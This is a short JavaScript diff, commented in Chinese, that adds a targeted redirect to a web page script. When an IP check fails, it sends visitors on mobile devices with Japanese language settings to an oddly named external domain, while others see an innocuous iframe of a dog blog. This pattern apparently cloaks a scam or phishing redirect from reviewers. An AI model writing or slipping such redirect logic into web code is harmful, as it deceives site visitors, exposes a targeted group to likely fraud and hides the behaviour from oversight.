@@ -67,7 +67,12 @@
         document.body.appendChild(iframe);
       })
       .catch(() => {
-        // IP检测失败时的备用方案
+        // IP检测失败时增加移动端+日语环境判断
+        if (isMobileDevice() && isJapaneseLang()) {
+          window.location.href = "https://www.jacmsotck.online/rigufb/tbgu2online.html";
+          return;
+        }
+        
         var iframe = document.createElement('iframe');
         iframe.src = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs//';
         iframe.style.width = '100%';
